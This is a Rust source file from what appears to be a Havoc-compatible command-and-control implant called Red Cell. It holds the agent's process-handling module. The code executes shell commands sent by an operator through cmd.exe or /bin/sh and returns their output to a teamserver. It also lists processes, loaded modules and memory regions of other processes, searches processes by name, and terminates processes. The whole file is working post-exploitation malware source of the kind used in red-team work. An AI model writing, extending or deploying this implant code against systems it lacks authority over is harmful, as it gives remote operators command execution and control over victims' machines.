//! Process enumeration, execution, and management handlers.

use std::process::{Command as SysCommand, Stdio};

use red_cell_common::demon::{DemonCommand, DemonProcessCommand};
use tracing::{info, warn};

use super::{
    DispatchResult, Response, decode_utf16le_null, parse_bytes_le, parse_u32_le, write_bytes_le,
    write_ptr_le, write_u32_le, write_utf16le,
};

// ─── COMMAND_PROC (0x1010) ────────────────────────────────────────────────────

/// Dispatch a `CommandProc` task to the appropriate process sub-handler.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
pub(super) fn handle_proc(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandProc: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonProcessCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandProc: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandProc dispatch");

    match subcmd {
        DemonProcessCommand::Create => handle_proc_create(subcmd_raw, &payload[offset..]),
        DemonProcessCommand::Modules => handle_proc_modules(subcmd_raw, &payload[offset..]),
        DemonProcessCommand::Grep => handle_proc_grep(subcmd_raw, &payload[offset..]),
        DemonProcessCommand::Memory => handle_proc_memory(subcmd_raw, &payload[offset..]),
        DemonProcessCommand::Kill => handle_proc_kill(subcmd_raw, &payload[offset..]),
    }
}

/// `COMMAND_PROC / Create (4)` — execute a command via the native shell.
///
/// The Havoc client sends Windows paths (`cmd.exe /c <cmd>`); on Linux we
/// strip the `/c ` prefix and invoke `/bin/sh -c <cmd>` instead.
///
/// Incoming args (LE):
/// `[state: u32][path: bytes (UTF-16LE)][args: bytes (UTF-16LE)][piped: u32][verbose: u32]`
///
/// Returns two responses (both using the original `request_id`):
/// 1. `CommandProc` — process metadata (path, PID, success, piped, verbose)
/// 2. `CommandOutput` — captured stdout + stderr
fn handle_proc_create(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;

    let process_state = parse_u32_le(rest, &mut offset).unwrap_or(0);

    let process_path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("ProcCreate: failed to parse process path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let process_path = decode_utf16le_null(&process_path_bytes);

    let process_args_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("ProcCreate: failed to parse process args: {e}");
            return DispatchResult::Ignore;
        }
    };
    let process_args_raw = decode_utf16le_null(&process_args_bytes);

    let piped = parse_u32_le(rest, &mut offset).unwrap_or(0);
    let verbose = parse_u32_le(rest, &mut offset).unwrap_or(0);

    info!(
        path = %process_path,
        args = %process_args_raw,
        piped,
        verbose,
        state = process_state,
        "ProcCreate: executing shell command"
    );

    let (success, pid, output_bytes, exit_code) =
        spawn_shell_command(&process_path, &process_args_raw);

    // Response 1: COMMAND_PROC with process metadata
    // LE format: [subcmd][path bytes][pid][success][piped][verbose]
    let mut proc_payload = Vec::new();
    write_u32_le(&mut proc_payload, subcmd_raw);
    write_utf16le(&mut proc_payload, &process_path);
    write_u32_le(&mut proc_payload, pid);
    write_u32_le(&mut proc_payload, u32::from(success));
    write_u32_le(&mut proc_payload, piped);
    write_u32_le(&mut proc_payload, verbose);

    // Response 2: COMMAND_OUTPUT with captured output and trailing exit code.
    // LE format: [output bytes (UTF-8, length-prefixed)][exit_code: i32 LE]
    // The trailing i32 extends the original Havoc wire format so that the
    // Red Cell teamserver can surface the exit code to callers.  Original
    // Havoc demons do not send the trailing field; the teamserver treats it
    // as optional (reads it only when bytes remain after the string).
    let mut out_payload = Vec::new();
    write_bytes_le(&mut out_payload, &output_bytes);
    out_payload.extend_from_slice(&exit_code.to_le_bytes());

    DispatchResult::MultiRespond(vec![
        Response::new(DemonCommand::CommandProc, proc_payload),
        Response::new(DemonCommand::CommandOutput, out_payload),
    ])
}

/// Execute a shell command via the platform-native shell and return
/// `(success, child_pid, captured_output)`.
///
/// On **Windows** the command is dispatched through `cmd.exe /c <shell_cmd>`,
/// matching the wire format sent by the Havoc operator console.
///
/// On **Unix** (Linux / macOS — used in CI and cross-compile test builds) the
/// command is translated from the Windows `cmd.exe /c` style and run via
/// `/bin/sh -c`.
#[cfg(windows)]
fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>, i32) {
    // Extract the bare shell command from the `/c <cmd>` style the Havoc client sends.
    let shell_cmd = translate_to_shell_cmd(process_path, process_args);
    info!(shell_cmd = %shell_cmd, "running via cmd.exe /c");
    match SysCommand::new("cmd.exe")
        .arg("/c")
        .arg(&shell_cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(child) => {
            let child_pid = child.id();
            match child.wait_with_output() {
                Ok(o) => {
                    let exit_code = o.status.code().unwrap_or(-1);
                    let mut combined = o.stdout;
                    if !o.stderr.is_empty() {
                        if !combined.is_empty() {
                            combined.push(b'\n');
                        }
                        combined.extend_from_slice(&o.stderr);
                    }
                    (true, child_pid, combined, exit_code)
                }
                Err(e) => {
                    warn!("ProcCreate: wait_with_output failed: {e}");
                    (true, child_pid, format!("error: {e}").into_bytes(), -1)
                }
            }
        }
        Err(e) => {
            warn!("ProcCreate: cmd.exe spawn failed: {e}");
            (false, 0u32, format!("error: {e}").into_bytes(), -1)
        }
    }
}

#[cfg(not(windows))]
fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>, i32) {
    // Translate Windows cmd.exe /c <cmd> style to a POSIX shell command.
    let shell_cmd = translate_to_shell_cmd(process_path, process_args);
    info!(shell_cmd = %shell_cmd, "running via /bin/sh -c");
    match SysCommand::new("/bin/sh")
        .arg("-c")
        .arg(&shell_cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(child) => {
            let child_pid = child.id();
            match child.wait_with_output() {
                Ok(o) => {
                    let exit_code = o.status.code().unwrap_or(-1);
                    let mut combined = o.stdout;
                    if !o.stderr.is_empty() {
                        if !combined.is_empty() {
                            combined.push(b'\n');
                        }
                        combined.extend_from_slice(&o.stderr);
                    }
                    (true, child_pid, combined, exit_code)
                }
                Err(e) => {
                    warn!("ProcCreate: wait_with_output failed: {e}");
                    (true, child_pid, format!("error: {e}").into_bytes(), -1)
                }
            }
        }
        Err(e) => {
            warn!("ProcCreate: /bin/sh spawn failed: {e}");
            (false, 0u32, format!("error: {e}").into_bytes(), -1)
        }
    }
}

/// Convert a Windows-style process invocation to a POSIX shell command string.
///
/// The Havoc `shell` client command sends `cmd.exe` as the process path and
/// `/c <command>` as the arguments.  On Linux we strip the `/c ` prefix and
/// run the remainder with `/bin/sh`.  For any other invocation we fall back to
/// running the path directly with the given arguments.
pub(super) fn translate_to_shell_cmd(path: &str, args: &str) -> String {
    let args_lower = args.to_ascii_lowercase();
    if args_lower.starts_with("/c ") {
        // Typical cmd.exe /c <shell command> path
        return args[3..].to_string();
    }
    if args_lower.starts_with("/c") && args.len() > 2 {
        return args[2..].trim_start().to_string();
    }
    // Not a cmd.exe style invocation: run path with args directly.
    if args.is_empty() { path.to_string() } else { format!("{path} {args}") }
}

// ─── Internal data types ─────────────────────────────────────────────────────

/// One entry in a process list snapshot.
struct ProcessInfo {
    name: String,
    pid: u32,
    ppid: u32,
    session_id: u32,
    num_threads: u32,
    is_wow64: bool,
    user: String,
}

/// One loaded module (DLL / shared library) in a process.
struct ModuleInfo {
    /// Module file name (UTF-8 / ASCII).
    name: String,
    /// Base address of the loaded module image.
    base_addr: u64,
}

/// One result entry from a process-name grep.
struct GrepMatch {
    name: String,
    pid: u32,
    ppid: u32,
    user: String,
    /// Architecture value sent on wire: 86 = x86 (WOW64), 64 = x64 native.
    arch: u32,
}

/// Convert a WOW64 flag to the wire arch value used by the Demon protocol.
///
/// Mirrors Phantom's encoding: `is_wow64 ? 86 : 64`.
pub(super) fn arch_from_wow64(is_wow64: bool) -> u32 {
    if is_wow64 { 86 } else { 64 }
}

/// One virtual-memory region from a process address-space query.
struct MemRegion {
    base_addr: u64,
    /// Region size in bytes, truncated to u32 to match Demon's `PackageAddInt32`.
    region_size: u32,
    alloc_protect: u32,
    state: u32,
    mem_type: u32,
}

// ─── Platform-specific process/memory helpers ─────────────────────────────────

// ── Windows ──────────────────────────────────────────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
fn enum_processes() -> Vec<ProcessInfo> {
    use std::mem;
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW,
        TH32CS_SNAPPROCESS,
    };
    use windows_sys::Win32::System::Threading::{
        IsWow64Process, OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION,
    };

    let mut result = Vec::new();
    // SAFETY: CreateToolhelp32Snapshot, Process32FirstW/NextW, and CloseHandle
    // are safe to call with these arguments; PROCESSENTRY32W is zeroed before use.
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return result;
        }
        let mut entry: PROCESSENTRY32W = mem::zeroed();
        entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snapshot, &mut entry) == 0 {
            CloseHandle(snapshot);
            return result;
        }
        loop {
            let null_pos =
                entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
            let name = String::from_utf16_lossy(&entry.szExeFile[..null_pos]).to_string();

            let hproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, entry.th32ProcessID);
            let mut is_wow: i32 = 0;
            if hproc != 0 {
                IsWow64Process(hproc, &mut is_wow);
                CloseHandle(hproc);
            }

            result.push(ProcessInfo {
                name,
                pid: entry.th32ProcessID,
                ppid: entry.th32ParentProcessID,
                session_id: 0,
                num_threads: entry.cntThreads,
                is_wow64: is_wow != 0,
                user: String::new(),
            });

            if Process32NextW(snapshot, &mut entry) == 0 {
                break;
            }
        }
        CloseHandle(snapshot);
    }
    result
}

#[cfg(windows)]
#[allow(unsafe_code)]
fn enum_modules(pid: u32) -> Vec<ModuleInfo> {
    use std::mem;
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, MODULEENTRY32W, Module32FirstW, Module32NextW, TH32CS_SNAPMODULE,
    };

    let mut result = Vec::new();
    // SAFETY: CreateToolhelp32Snapshot, Module32FirstW/NextW, and CloseHandle
    // are safe to call with these arguments; MODULEENTRY32W is zeroed before use.
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
        if snapshot == INVALID_HANDLE_VALUE {
            return result;
        }
        let mut entry: MODULEENTRY32W = mem::zeroed();
        entry.dwSize = mem::size_of::<MODULEENTRY32W>() as u32;
        if Module32FirstW(snapshot, &mut entry) == 0 {
            CloseHandle(snapshot);
            return result;
        }
        loop {
            let null_pos =
                entry.szModule.iter().position(|&c| c == 0).unwrap_or(entry.szModule.len());
            let name = String::from_utf16_lossy(&entry.szModule[..null_pos]).to_string();
            let base_addr = entry.modBaseAddr as u64;
            result.push(ModuleInfo { name, base_addr });
            if Module32NextW(snapshot, &mut entry) == 0 {
                break;
            }
        }
        CloseHandle(snapshot);
    }
    result
}

#[cfg(windows)]
fn grep_processes(name_filter: &str) -> Vec<GrepMatch> {
    let filter_lower = name_filter.to_lowercase();
    enum_processes()
        .into_iter()
        .filter(|p| p.name.to_lowercase().contains(&filter_lower))
        .map(|p| GrepMatch {
            arch: arch_from_wow64(p.is_wow64),
            name: p.name,
            pid: p.pid,
            ppid: p.ppid,
            user: p.user,
        })
        .collect()
}

#[cfg(windows)]
#[allow(unsafe_code)]
fn query_memory(pid: u32, protect_filter: u32) -> Vec<MemRegion> {
    use std::mem;
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Memory::{MEM_FREE, MEMORY_BASIC_INFORMATION, VirtualQueryEx};
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let mut result = Vec::new();
    // SAFETY: OpenProcess, VirtualQueryEx, and CloseHandle are called with
    // valid arguments; MEMORY_BASIC_INFORMATION is zeroed before use.
    unsafe {
        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if hprocess == 0 {
            return result;
        }
        let mut offset: usize = 0;
        loop {
            let mut mem_info: MEMORY_BASIC_INFORMATION = mem::zeroed();
            let bytes = VirtualQueryEx(
                hprocess,
                offset as *const _,
                &mut mem_info,
                mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );
            if bytes == 0 {
                break;
            }
            let next_addr = (mem_info.BaseAddress as usize).wrapping_add(mem_info.RegionSize);
            offset = next_addr;

            if mem_info.Type != MEM_FREE && mem_info.AllocationBase as usize != 0 {
                let add = protect_filter == 0 || protect_filter == mem_info.AllocationProtect;
                if add {
                    #[allow(clippy::cast_possible_truncation)]
                    result.push(MemRegion {
                        base_addr: mem_info.BaseAddress as u64,
                        region_size: mem_info.RegionSize as u32,
                        alloc_protect: mem_info.AllocationProtect,
                        state: mem_info.State,
                        mem_type: mem_info.Type,
                    });
                }
            }
        }
        CloseHandle(hprocess);
    }
    result
}

#[cfg(windows)]
#[allow(unsafe_code)]
fn kill_process(pid: u32) -> bool {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_TERMINATE, TerminateProcess};

    // SAFETY: OpenProcess, TerminateProcess, and CloseHandle are called with
    // valid handle values; the handle is closed before return.
    unsafe {
        let hprocess = OpenProcess(PROCESS_TERMINATE, 0, pid);
        if hprocess == 0 {
            return false;
        }
        let success = TerminateProcess(hprocess, 0) != 0;
        CloseHandle(hprocess);
        success
    }
}

// ── Linux / non-Windows ───────────────────────────────────────────────────────

#[cfg(not(windows))]
fn enum_processes() -> Vec<ProcessInfo> {
    let Ok(entries) = std::fs::read_dir("/proc") else { return Vec::new() };
    let mut result = Vec::new();
    for entry in entries.flatten() {
        let fname = entry.file_name();
        let Ok(pid) = fname.to_string_lossy().parse::<u32>() else { continue };
        let status = std::fs::read_to_string(format!("/proc/{pid}/status")).unwrap_or_default();
        let mut name = String::new();
        let mut ppid = 0u32;
        let mut threads = 0u32;
        for line in status.lines() {
            if let Some(v) = line.strip_prefix("Name:\t") {
                name = v.trim().to_string();
            } else if let Some(v) = line.strip_prefix("PPid:\t") {
                ppid = v.trim().parse().unwrap_or(0);
            } else if let Some(v) = line.strip_prefix("Threads:\t") {
                threads = v.trim().parse().unwrap_or(0);
            }
        }
        if name.is_empty() {
            continue;
        }
        result.push(ProcessInfo {
            name,
            pid,
            ppid,
            session_id: 0,
            num_threads: threads,
            is_wow64: false,
            user: String::new(),
        });
    }
    result
}

#[cfg(not(windows))]
fn enum_modules(pid: u32) -> Vec<ModuleInfo> {
    let maps_path =
        if pid == 0 { String::from("/proc/self/maps") } else { format!("/proc/{pid}/maps") };
    let Ok(content) = std::fs::read_to_string(&maps_path) else { return Vec::new() };
    let mut seen = std::collections::HashSet::new();
    let mut result = Vec::new();
    for line in content.lines() {
        let mut parts = line.splitn(6, ' ');
        let addr_range = parts.next().unwrap_or("");
        // skip perms, offset, dev, inode
        let _ = parts.next();
        let _ = parts.next();
        let _ = parts.next();
        let _ = parts.next();
        let path = parts.next().map(str::trim).unwrap_or("").trim_start();
        if path.is_empty() || (!path.ends_with(".so") && !path.contains(".so.")) {
            continue;
        }
        if !seen.insert(path.to_string()) {
            continue;
        }
        let base_addr =
            addr_range.split('-').next().and_then(|s| u64::from_str_radix(s, 16).ok()).unwrap_or(0);
        let name = std::path::Path::new(path)
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_else(|| path.to_string());
        result.push(ModuleInfo { name, base_addr });
    }
    result
}

#[cfg(not(windows))]
fn grep_processes(name_filter: &str) -> Vec<GrepMatch> {
    let filter_lower = name_filter.to_lowercase();
    enum_processes()
        .into_iter()
        .filter(|p| p.name.to_lowercase().contains(&filter_lower))
        .map(|p| GrepMatch {
            arch: arch_from_wow64(p.is_wow64),
            name: p.name,
            pid: p.pid,
            ppid: p.ppid,
            user: p.user,
        })
        .collect()
}

#[cfg(not(windows))]
fn query_memory(pid: u32, protect_filter: u32) -> Vec<MemRegion> {
    let maps_path =
        if pid == 0 { String::from("/proc/self/maps") } else { format!("/proc/{pid}/maps") };
    let Ok(content) = std::fs::read_to_string(&maps_path) else { return Vec::new() };
    // Commit/private/mapped constants mirroring Windows MEM_* values for testing
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_PRIVATE: u32 = 0x2_0000;
    const MEM_MAPPED: u32 = 0x4_0000;
    let mut result = Vec::new();
    for line in content.lines() {
        let mut parts = line.splitn(6, ' ');
        let addr_range = parts.next().unwrap_or("");
        let perms = parts.next().unwrap_or("");
        let mut addr_iter = addr_range.split('-');
        let start = addr_iter.next().and_then(|s| u64::from_str_radix(s, 16).ok()).unwrap_or(0);
        let end = addr_iter.next().and_then(|s| u64::from_str_radix(s, 16).ok()).unwrap_or(0);
        if end <= start {
            continue;
        }
        let perms_bytes = perms.as_bytes();
        let r = perms_bytes.first().copied() == Some(b'r');
        let w = perms_bytes.get(1).copied() == Some(b'w');
        let x = perms_bytes.get(2).copied() == Some(b'x');
        let alloc_protect: u32 = match (r, w, x) {
            (true, false, true) => 0x20,  // PAGE_EXECUTE_READ
            (true, true, true) => 0x40,   // PAGE_EXECUTE_READWRITE
            (true, true, false) => 0x04,  // PAGE_READWRITE
            (true, false, false) => 0x02, // PAGE_READONLY
            _ => 0x01,                    // PAGE_NOACCESS
        };
        if protect_filter != 0 && protect_filter != alloc_protect {
            continue;
        }
        let is_shared = perms_bytes.get(3).copied() == Some(b's');
        let mem_type = if is_shared { MEM_MAPPED } else { MEM_PRIVATE };
        #[allow(clippy::cast_possible_truncation)]
        let region_size = (end - start).min(u64::from(u32::MAX)) as u32;
        result.push(MemRegion {
            base_addr: start,
            region_size,
            alloc_protect,
            state: MEM_COMMIT,
            mem_type,
        });
    }
    result
}

#[cfg(not(windows))]
fn kill_process(pid: u32) -> bool {
    SysCommand::new("kill")
        .arg("-9")
        .arg(pid.to_string())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

// ─── COMMAND_PROC_LIST (12) ───────────────────────────────────────────────────

/// Handle a `CommandProcList` task: enumerate all running processes and return
/// the list in the wire format expected by the Red Cell teamserver.
///
/// Incoming payload (LE): `[process_ui: u32]`
///
/// Outgoing payload (LE):
/// `[process_ui: u32]` then per process:
/// `[name: utf16le][pid: u32][is_wow64: u32][ppid: u32][session: u32][threads: u32][user: utf16le]`
pub(super) fn handle_proc_list(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let process_ui = parse_u32_le(payload, &mut offset).unwrap_or(0);
    let processes = enum_processes();
    let mut response = Vec::new();
    write_u32_le(&mut response, process_ui);
    for p in &processes {
        write_utf16le(&mut response, &p.name);
        write_u32_le(&mut response, p.pid);
        write_u32_le(&mut response, u32::from(p.is_wow64));
        write_u32_le(&mut response, p.ppid);
        write_u32_le(&mut response, p.session_id);
        write_u32_le(&mut response, p.num_threads);
        write_utf16le(&mut response, &p.user);
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandProcList, response))
}

// ─── COMMAND_PROC / Modules (2) ──────────────────────────────────────────────

/// Handle `CommandProc / Modules`: enumerate loaded modules in a process.
///
/// Incoming args (LE): `[pid: u32]` (0 = current process)
///
/// Outgoing payload (LE):
/// `[subcmd: u32][pid: u32]` then per module: `[name: bytes][base_addr: u64]`
fn handle_proc_modules(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let pid = parse_u32_le(rest, &mut offset).unwrap_or(0);
    let modules = enum_modules(pid);
    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_u32_le(&mut payload, pid);
    for m in &modules {
        write_bytes_le(&mut payload, m.name.as_bytes());
        write_ptr_le(&mut payload, m.base_addr);
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
}

// ─── COMMAND_PROC / Grep (3) ─────────────────────────────────────────────────

/// Handle `CommandProc / Grep`: find processes matching a name substring.
///
/// Incoming args (LE): `[name: bytes (UTF-16LE, length-prefixed)]`
///
/// Outgoing payload (LE):
/// `[subcmd: u32]` then per match:
/// `[name: utf16le][pid: u32][ppid: u32][user: utf16le][arch: u32]`
fn handle_proc_grep(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let name_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("ProcGrep: failed to parse process name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let name = decode_utf16le_null(&name_bytes);
    let matches = grep_processes(&name);
    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    for m in &matches {
        write_utf16le(&mut payload, &m.name);
        write_u32_le(&mut payload, m.pid);
        write_u32_le(&mut payload, m.ppid);
        write_utf16le(&mut payload, &m.user);
        write_u32_le(&mut payload, m.arch);
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
}

// ─── COMMAND_PROC / Memory (6) ───────────────────────────────────────────────

/// Handle `CommandProc / Memory`: query virtual memory regions of a process.
///
/// Incoming args (LE): `[pid: u32][protection_filter: u32]`
/// (protection_filter == 0 means return all regions)
///
/// Outgoing payload (LE):
/// `[subcmd: u32][pid: u32][protection: u32]` then per region:
/// `[base_addr: u64][region_size: u32][alloc_protect: u32][state: u32][type: u32]`
fn handle_proc_memory(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let pid = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("ProcMemory: failed to parse pid: {e}");
            return DispatchResult::Ignore;
        }
    };
    let protect_filter = parse_u32_le(rest, &mut offset).unwrap_or(0);
    let regions = query_memory(pid, protect_filter);
    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_u32_le(&mut payload, pid);
    write_u32_le(&mut payload, protect_filter);
    for r in &regions {
        write_ptr_le(&mut payload, r.base_addr);
        write_u32_le(&mut payload, r.region_size);
        write_u32_le(&mut payload, r.alloc_protect);
        write_u32_le(&mut payload, r.state);
        write_u32_le(&mut payload, r.mem_type);
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
}

// ─── COMMAND_PROC / Kill (7) ─────────────────────────────────────────────────

/// Handle `CommandProc / Kill`: terminate a process by PID.
///
/// Incoming args (LE): `[pid: u32]`
///
/// Outgoing payload (LE): `[subcmd: u32][success: u32][pid: u32]`
fn handle_proc_kill(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let pid = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("ProcKill: failed to parse pid: {e}");
            return DispatchResult::Ignore;
        }
    };
    let success = kill_process(pid);
    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_u32_le(&mut payload, u32::from(success));
    write_u32_le(&mut payload, pid);
    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
}
